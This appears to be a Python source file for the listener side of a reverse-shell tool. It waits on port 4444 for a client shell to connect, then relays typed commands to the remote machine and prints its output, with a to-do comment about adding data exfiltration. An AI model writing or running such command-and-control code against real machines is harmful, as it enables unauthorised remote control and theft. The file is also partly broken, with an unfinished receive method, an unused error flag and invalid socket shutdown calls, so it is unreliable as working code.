import getpass
from multi import utils
from .nodeutils import (
    os,
    subprocess,
    sys,
    SocketStream,
    socket
)
# todo: call utils.status with stdout keyword argument for commands


class Server(SocketStream):
    """TCP socket server class for the command shell"""
    def __init__(self, lhost="0.0.0.0", port: int = 4444, buff: int = 1024, verb=False):
        super().__init__(lhost, port, buff, verb)

    def recv_size(self, sock: socket.socket):
        """"""
        # todo: add handling for larger than expected buffers
        total_len, total_data = 0, []
        max_size = sys.maxsize

    def listen(self) -> None:
        """Begin listening for incoming TCP connection from the client shell"""
        server_sock = socket.socket()
        server_sock.setblocking(True)
        # server_sock.settimeout(60)

        client_sock = socket.socket()
        client_sock.setblocking(True)
        # client_sock.settimeout(60)

        server_sock.bind((self.Address, self.Port))

        try:
            server_sock.listen(1)  # stay open for one connection
            utils.status(f"Listening for incoming TCP connection on port {self.Port}...")

            client_sock, addr = server_sock.accept()
            utils.status(f"Received connection from {addr[0]} on port {addr[1]}.")
        except KeyboardInterrupt:
            utils.throw(f"User keyboard interrupt has been thrown.")

        user, host = getpass.getuser(), socket.gethostname()
        client_sock.sendall(f"Connection established with {host}".encode())

        # todo: create handling for data exfiltration
        client_info = client_sock.recv(self.Buffer).decode()
        utils.status(client_info)

        caught_except = False

        try:
            while True:
                if os.name == "nt":
                    prompt = f"Shell {os.getcwd()}> "
                else:
                    prompt = f"{user}@{host}:{os.getcwd()}> "

                command = input(f"{prompt}")
                client_sock.sendall(command.encode())

                if command.lower() in ["exit", "quit"]:
                    client_sock.sendall("Connection will now terminate".encode())
                    break

                cmd_results = client_sock.recv(self.Buffer).decode()
                utils.status(cmd_results)
        except Exception as exc:
            self.except_handler(exc)
        finally:
            #client_sock.shutdown(socket.socket.SHUT_WR)
            client_sock.shutdown(socket.socket.SHUT_WR)
            #server_sock.shutdown(socket.socket.SHUT_WR)
            server_sock.shutdown(socket.socket.SHUT_WR)

            client_sock.close()
            server_sock.close()

            if caught_except:
                utils.throw()
